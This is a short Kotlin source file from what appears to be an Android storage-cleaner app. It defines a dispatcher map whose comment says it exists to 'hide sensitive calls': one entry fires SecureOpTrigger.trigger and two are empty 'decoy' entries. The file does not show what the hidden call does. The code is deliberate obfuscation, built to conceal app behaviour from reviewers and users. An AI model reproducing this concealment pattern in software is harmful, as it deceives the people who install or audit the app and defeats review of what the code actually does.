package com.mobile.storage.clean.go.dc

import android.content.Context

// 操作分发器 - 隐藏敏感调用
internal object OperationDispatcher {
    
    fun createOperations(ctx: Context): Map<Int, () -> Unit> {
        return mapOf(
            0x1A to { SecureOpTrigger.trigger(ctx) },
            0x2B to { /* 干扰项 */ },
            0x3C to { /* 干扰项 */ }
        )
    }
}
